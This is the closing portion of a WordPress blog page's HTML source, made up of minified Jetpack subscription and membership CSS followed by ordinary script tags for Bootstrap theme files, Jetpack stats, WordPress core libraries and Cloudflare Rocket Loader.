.components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}</style>
<script type="63937a03c1b5e11e36329285-text/javascript" src="/wp-content/themes/wp-bootstrap-starter/inc/assets/js/popper.min.js?ver=6.8.1" id="wp-bootstrap-starter-popper-js"></script>
<script type="63937a03c1b5e11e36329285-text/javascript" src="/wp-content/themes/wp-bootstrap-starter/inc/assets/js/bootstrap.min.js?ver=6.8.1" id="wp-bootstrap-starter-bootstrapjs-js"></script>
<script type="63937a03c1b5e11e36329285-text/javascript" src="/wp-content/themes/wp-bootstrap-starter/inc/assets/js/theme-script.min.js?ver=6.8.1" id="wp-bootstrap-starter-themejs-js"></script>
<script type="63937a03c1b5e11e36329285-text/javascript" src="/wp-content/themes/wp-bootstrap-starter/inc/assets/js/skip-link-focus-fix.min.js?ver=20151215" id="wp-bootstrap-starter-skip-link-focus-fix-js"></script>
<script type="63937a03c1b5e11e36329285-text/javascript" id="jetpack-stats-js-before">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"174576423\",\"post\":\"0\",\"tz\":\"8\",\"srv\":\"anotsodev.me\",\"arch_home\":\"1\",\"j\":\"1:14.8\"}") ]);
_stq.push([ "clickTrackerInit", "174576423", "0" ]);
/* ]]> */
</script>
<script type="63937a03c1b5e11e36329285-text/javascript" src="https://stats.wp.com/e-202528.js" id="jetpack-stats-js" defer data-wp-strategy="defer"></script>
<script type="63937a03c1b5e11e36329285-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="63937a03c1b5e11e36329285-text/javascript" src="https://c0.wp.com/c/6.8.1/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="63937a03c1b5e11e36329285-text/javascript" src="https://c0.wp.com/c/6.8.1/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="63937a03c1b5e11e36329285-text/javascript" src="/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=14.8" id="jetpack-block-subscriptions-js"></script>
<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="63937a03c1b5e11e36329285-|49" defer></script>
</body>
</html>